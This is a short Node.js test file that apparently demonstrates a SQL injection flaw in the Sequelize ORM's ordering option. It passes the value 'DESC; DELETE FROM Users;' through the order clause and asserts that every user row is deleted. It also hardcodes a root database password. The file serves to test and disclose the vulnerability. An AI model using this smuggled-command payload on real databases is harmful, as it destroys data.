const { test } = require("node:test");
const { equal } = require("node:assert");

test("Vulnerable to SQL Injection", async () => {
  const Sequelize = require("sequelize");

  const sequelize = new Sequelize("mysql://root:123456@172.17.0.1:3306/test", {
    dialectOptions: {
      multipleStatements: true,
    },
  });

  const User = sequelize.define("User", {
    username: Sequelize.STRING,
    password: Sequelize.STRING,
  });

  await sequelize.sync();

  await User.insertOrUpdate({
    username: "admin",
    password: "admin",
  });

  const result = await User.findAndCountAll({
    order: [["id", "DESC; DELETE FROM Users;"]],
  });

  equal(result.count, 1);

  const result2 = await User.findAndCountAll();
  equal(result2.count, 0);

  await sequelize.close();
});
